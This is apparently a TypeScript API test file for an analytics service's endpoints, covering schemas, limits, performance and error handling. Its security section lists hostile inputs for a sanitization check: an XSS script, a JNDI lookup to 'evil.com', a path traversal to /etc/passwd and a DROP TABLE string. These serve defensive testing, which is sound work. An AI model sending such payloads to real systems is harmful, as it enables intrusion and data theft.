import { spec } from 'pactum';
import { DatabaseTestHelper } from './shared/kanban-database';

describe('Analytics API', () => {
  let dbHelper: DatabaseTestHelper;

  beforeAll(async () => {
    dbHelper = new DatabaseTestHelper();
    await dbHelper.initializeDatabase();
  });

  afterAll(async () => {
    await dbHelper.cleanup();
  });

  beforeEach(async () => {
    await dbHelper.cleanupData();
  });

  describe('Analytics Endpoints', () => {
    it('should get analytics data', async () => {
      await spec()
        .get('/api/analytics')
        .expectStatus(200)
        .expectJsonMatch({
          totalSessions: /^\d+$/,
          successRate: /^\d+(\.\d+)?$/,
          averageTimeToSuccess: /^\d+(\.\d+)?$/,
          averageAttemptsToSuccess: /^\d+(\.\d+)?$/,
          mostFailedStage: /^.+$/,
          stageSuccessRates: /.*/,
          dailyStats: /.*/
        });
    });

    it('should get recent sessions', async () => {
      const response = await spec()
        .get('/api/analytics/sessions')
        .expectStatus(200)
        .expectJsonMatch({
          sessions: /.*/
        });

      expect(Array.isArray(response.json.sessions)).toBe(true);
    });

    it('should get specific session by id', async () => {
      // First create some validation data to ensure we have sessions
      const sessions = await spec()
        .get('/api/analytics/sessions')
        .expectStatus(200);

      if (sessions.json.sessions.length > 0) {
        const sessionId = sessions.json.sessions[0].sessionId;
        
        await spec()
          .get(`/api/analytics/sessions/${sessionId}`)
          .expectStatus(200)
          .expectJsonMatch({
            sessionId: sessionId,
            startTime: /^\d+$/,
            finalSuccess: /^(true|false)$/,
            attempts: /.*/
          });
      }
    });

    it('should handle limit parameter for sessions', async () => {
      const limit = 5;
      const response = await spec()
        .get(`/api/analytics/sessions?limit=${limit}`)
        .expectStatus(200);

      expect(response.json.sessions.length).toBeLessThanOrEqual(limit);
    });

    it('should return 404 for non-existent session', async () => {
      await spec()
        .get('/api/analytics/sessions/non-existent-id')
        .expectStatus(404);
    });
  });

  describe('Analytics Data Validation', () => {
    it('should return valid analytics structure', async () => {
      const response = await spec()
        .get('/api/analytics')
        .expectStatus(200);

      const analytics = response.json;

      // Validate data types
      expect(typeof analytics.totalSessions).toBe('number');
      expect(typeof analytics.successRate).toBe('number');
      expect(typeof analytics.averageTimeToSuccess).toBe('number');
      expect(typeof analytics.averageAttemptsToSuccess).toBe('number');
      expect(typeof analytics.mostFailedStage).toBe('string');
      expect(typeof analytics.stageSuccessRates).toBe('object');
      expect(typeof analytics.dailyStats).toBe('object');

      // Validate ranges
      expect(analytics.totalSessions).toBeGreaterThanOrEqual(0);
      expect(analytics.successRate).toBeGreaterThanOrEqual(0);
      expect(analytics.successRate).toBeLessThanOrEqual(100);
      expect(analytics.averageTimeToSuccess).toBeGreaterThanOrEqual(0);
      expect(analytics.averageAttemptsToSuccess).toBeGreaterThanOrEqual(0);
    });

    it('should return consistent stage success rates', async () => {
      const response = await spec()
        .get('/api/analytics')
        .expectStatus(200);

      const { stageSuccessRates } = response.json;

      // Validate stage success rate structure
      Object.entries(stageSuccessRates).forEach(([stageId, stats]: [string, any]) => {
        expect(typeof stageId).toBe('string');
        expect(typeof stats.attempts).toBe('number');
        expect(typeof stats.successes).toBe('number');
        expect(typeof stats.rate).toBe('number');
        
        expect(stats.attempts).toBeGreaterThanOrEqual(0);
        expect(stats.successes).toBeGreaterThanOrEqual(0);
        expect(stats.successes).toBeLessThanOrEqual(stats.attempts);
        expect(stats.rate).toBeGreaterThanOrEqual(0);
        expect(stats.rate).toBeLessThanOrEqual(100);
      });
    });

    it('should return valid daily statistics', async () => {
      const response = await spec()
        .get('/api/analytics')
        .expectStatus(200);

      const { dailyStats } = response.json;

      // Validate daily stats structure
      Object.entries(dailyStats).forEach(([date, stats]: [string, any]) => {
        // Validate date format (YYYY-MM-DD)
        expect(date).toMatch(/^\d{4}-\d{2}-\d{2}$/);
        
        expect(typeof stats.sessions).toBe('number');
        expect(typeof stats.successes).toBe('number');
        expect(typeof stats.totalTime).toBe('number');
        
        expect(stats.sessions).toBeGreaterThanOrEqual(0);
        expect(stats.successes).toBeGreaterThanOrEqual(0);
        expect(stats.successes).toBeLessThanOrEqual(stats.sessions);
        expect(stats.totalTime).toBeGreaterThanOrEqual(0);
      });
    });

    it('should return valid session structure', async () => {
      const response = await spec()
        .get('/api/analytics/sessions')
        .expectStatus(200);

      const { sessions } = response.json;

      sessions.forEach((session: any) => {
        expect(typeof session.sessionId).toBe('string');
        expect(typeof session.startTime).toBe('number');
        expect(typeof session.finalSuccess).toBe('boolean');
        expect(Array.isArray(session.attempts)).toBe(true);
        
        expect(session.startTime).toBeGreaterThan(0);
        
        // Validate attempts structure
        session.attempts.forEach((attempt: any) => {
          expect(typeof attempt.attempt).toBe('number');
          expect(typeof attempt.timestamp).toBe('string');
          expect(typeof attempt.startTime).toBe('number');
          expect(typeof attempt.totalTime).toBe('number');
          expect(typeof attempt.success).toBe('boolean');
          expect(Array.isArray(attempt.stages)).toBe(true);
          
          // Validate stages structure
          attempt.stages.forEach((stage: any) => {
            expect(typeof stage.id).toBe('string');
            expect(typeof stage.name).toBe('string');
            expect(typeof stage.success).toBe('boolean');
            expect(typeof stage.duration).toBe('number');
            expect(typeof stage.attempt).toBe('number');
            
            expect(stage.duration).toBeGreaterThanOrEqual(0);
            expect(stage.attempt).toBeGreaterThan(0);
          });
        });
      });
    });
  });

  describe('Analytics Performance', () => {
    it('should handle large datasets efficiently', async () => {
      const startTime = Date.now();
      
      await spec()
        .get('/api/analytics')
        .expectStatus(200);
      
      const endTime = Date.now();
      const responseTime = endTime - startTime;
      
      // Analytics should respond within 5 seconds even with large datasets
      expect(responseTime).toBeLessThan(5000);
    });

    it('should handle concurrent requests', async () => {
      const concurrentRequests = 10;
      const requests = [];
      
      for (let i = 0; i < concurrentRequests; i++) {
        requests.push(
          spec()
            .get('/api/analytics')
            .expectStatus(200)
        );
      }
      
      const responses = await Promise.all(requests);
      
      // All requests should succeed
      expect(responses).toHaveLength(concurrentRequests);
      
      // All responses should have consistent structure
      responses.forEach(response => {
        expect(response.json).toMatchObject({
          totalSessions: expect.any(Number),
          successRate: expect.any(Number),
          averageTimeToSuccess: expect.any(Number),
          averageAttemptsToSuccess: expect.any(Number),
          mostFailedStage: expect.any(String),
          stageSuccessRates: expect.any(Object),
          dailyStats: expect.any(Object)
        });
      });
    });

    it('should cache analytics data appropriately', async () => {
      // First request
      const startTime1 = Date.now();
      const response1 = await spec()
        .get('/api/analytics')
        .expectStatus(200);
      const responseTime1 = Date.now() - startTime1;
      
      // Second request (should potentially be faster if cached)
      const startTime2 = Date.now();
      const response2 = await spec()
        .get('/api/analytics')
        .expectStatus(200);
      const responseTime2 = Date.now() - startTime2;
      
      // Responses should be identical (same data)
      expect(response1.json).toEqual(response2.json);
      
      // Note: We don't strictly enforce caching behavior here since it depends on implementation
      console.log(`First request: ${responseTime1}ms, Second request: ${responseTime2}ms`);
    });
  });

  describe('Analytics Filtering and Pagination', () => {
    it('should support session limit filtering', async () => {
      const limits = [1, 5, 10, 20];
      
      for (const limit of limits) {
        const response = await spec()
          .get(`/api/analytics/sessions?limit=${limit}`)
          .expectStatus(200);
        
        expect(response.json.sessions.length).toBeLessThanOrEqual(limit);
      }
    });

    it('should handle invalid limit parameters gracefully', async () => {
      const invalidLimits = [-1, 0, 'invalid', 1000000];
      
      for (const limit of invalidLimits) {
        const response = await spec()
          .get(`/api/analytics/sessions?limit=${limit}`)
          .expectStatus(200);
        
        // Should still return valid response, possibly with default limit
        expect(Array.isArray(response.json.sessions)).toBe(true);
      }
    });

    it('should support date range filtering if implemented', async () => {
      // Note: This test assumes date range filtering might be implemented
      const response = await spec()
        .get('/api/analytics?from=2024-01-01&to=2024-12-31')
        .expectStatus(200);
      
      expect(response.json).toMatchObject({
        totalSessions: expect.any(Number),
        successRate: expect.any(Number)
      });
    });
  });

  describe('Analytics Data Export', () => {
    it('should support CSV export if implemented', async () => {
      // This test checks if CSV export is available
      const response = await spec()
        .get('/api/analytics/export?format=csv')
        .expectStatus(200)
        .expectHeaderContains('content-type', 'text/csv');
      
      // CSV should have proper headers
      const csvContent = response.text;
      expect(csvContent).toContain(','); // Basic CSV validation
    }).catch(() => {
      // CSV export might not be implemented yet
      console.log('CSV export not available - this is expected if not yet implemented');
    });

    it('should support JSON export if implemented', async () => {
      const response = await spec()
        .get('/api/analytics/export?format=json')
        .expectStatus(200)
        .expectHeaderContains('content-type', 'application/json');
      
      const jsonData = response.json;
      expect(typeof jsonData).toBe('object');
    }).catch(() => {
      // JSON export might not be implemented yet
      console.log('JSON export not available - this is expected if not yet implemented');
    });

    it('should handle invalid export formats gracefully', async () => {
      await spec()
        .get('/api/analytics/export?format=invalid')
        .expectStatus(400)
        .expectJsonMatch({
          error: /invalid.*format|unsupported.*format/i
        });
    }).catch(() => {
      // Export functionality might not be implemented yet
      console.log('Export functionality not available - this is expected if not yet implemented');
    });
  });

  describe('Analytics Error Handling', () => {
    it('should handle database connection issues gracefully', async () => {
      // This is a conceptual test - in practice, you'd mock database failures
      // For now, we just ensure the endpoint doesn't crash
      const response = await spec()
        .get('/api/analytics')
        .expectStatus(200);
      
      expect(response.json).toBeDefined();
    });

    it('should handle corrupted data gracefully', async () => {
      // This test ensures the analytics service can handle edge cases
      const response = await spec()
        .get('/api/analytics')
        .expectStatus(200);
      
      // Should return valid structure even if underlying data has issues
      expect(response.json).toMatchObject({
        totalSessions: expect.any(Number),
        successRate: expect.any(Number),
        averageTimeToSuccess: expect.any(Number),
        averageAttemptsToSuccess: expect.any(Number),
        mostFailedStage: expect.any(String),
        stageSuccessRates: expect.any(Object),
        dailyStats: expect.any(Object)
      });
    });

    it('should validate input parameters', async () => {
      // Test various invalid session IDs
      const invalidIds = ['', 'invalid-id', '12345', 'null', 'undefined'];
      
      for (const id of invalidIds) {
        await spec()
          .get(`/api/analytics/sessions/${id}`)
          .expectStatus(404);
      }
    });

    it('should handle memory constraints with large datasets', async () => {
      // This test ensures the analytics service doesn't consume excessive memory
      const response = await spec()
        .get('/api/analytics/sessions?limit=100')
        .expectStatus(200);
      
      expect(Array.isArray(response.json.sessions)).toBe(true);
      expect(response.json.sessions.length).toBeLessThanOrEqual(100);
    });
  });

  describe('Real-time Analytics Updates', () => {
    it('should reflect changes in analytics after new validation runs', async () => {
      // Get initial analytics
      const initialResponse = await spec()
        .get('/api/analytics')
        .expectStatus(200);
      
      const initialSessions = initialResponse.json.totalSessions;
      
      // Note: In a real test, you'd trigger a validation run here
      // For now, we just verify the structure is consistent
      
      const updatedResponse = await spec()
        .get('/api/analytics')
        .expectStatus(200);
      
      expect(updatedResponse.json.totalSessions).toBeGreaterThanOrEqual(initialSessions);
    });

    it('should update session data incrementally', async () => {
      // Get initial session count
      const initialSessions = await spec()
        .get('/api/analytics/sessions?limit=1000')
        .expectStatus(200);
      
      const initialCount = initialSessions.json.sessions.length;
      
      // After some time or activity, session count might increase
      const updatedSessions = await spec()
        .get('/api/analytics/sessions?limit=1000')
        .expectStatus(200);
      
      expect(updatedSessions.json.sessions.length).toBeGreaterThanOrEqual(initialCount);
    });
  });

  describe('Analytics Security', () => {
    it('should not expose sensitive information', async () => {
      const response = await spec()
        .get('/api/analytics')
        .expectStatus(200);
      
      const analyticsData = JSON.stringify(response.json);
      
      // Should not contain sensitive patterns
      const sensitivePatterns = [
        /password/i,
        /secret/i,
        /key/i,
        /token/i,
        /api.*key/i
      ];
      
      sensitivePatterns.forEach(pattern => {
        expect(analyticsData).not.toMatch(pattern);
      });
    });

    it('should not expose internal system paths', async () => {
      const response = await spec()
        .get('/api/analytics/sessions')
        .expectStatus(200);
      
      const sessionsData = JSON.stringify(response.json);
      
      // Should not contain internal paths
      const pathPatterns = [
        /\/Users\//,
        /\/home\//,
        /C:\\/,
        /node_modules/,
        /\.env/
      ];
      
      pathPatterns.forEach(pattern => {
        expect(sessionsData).not.toMatch(pattern);
      });
    });

    it('should sanitize user input in analytics', async () => {
      // Test that user-provided data is sanitized
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../etc/passwd',
        'DROP TABLE analytics;'
      ];
      
      for (const input of maliciousInputs) {
        const response = await spec()
          .get(`/api/analytics/sessions/${encodeURIComponent(input)}`)
          .expectStatus(404);
        
        // Should return proper error, not execute malicious input
        expect(response.json).not.toContain(input);
      }
    });
  });

  describe('Analytics Metadata', () => {
    it('should include metadata about data freshness', async () => {
      const response = await spec()
        .get('/api/analytics')
        .expectStatus(200);
      
      // Check if response includes timestamp or freshness info
      const possibleMetadataFields = [
        'lastUpdated',
        'generatedAt', 
        'dataTimestamp',
        'cacheTime'
      ];
      
      let hasMetadata = false;
      possibleMetadataFields.forEach(field => {
        if (response.json[field] !== undefined) {
          hasMetadata = true;
        }
      });
      
      // Metadata is optional but recommended
      if (hasMetadata) {
        console.log('Analytics includes metadata - this is good practice');
      }
    });

    it('should provide version information if available', async () => {
      const response = await spec()
        .get('/api/analytics')
        .expectStatus(200);
      
      // Check for version or schema information
      const versionFields = ['version', 'schemaVersion', 'apiVersion'];
      
      let hasVersion = false;
      versionFields.forEach(field => {
        if (response.json[field] !== undefined) {
          hasVersion = true;
          expect(typeof response.json[field]).toBe('string');
        }
      });
      
      // Version info is optional
      if (hasVersion) {
        console.log('Analytics includes version information');
      }
    });
  });
});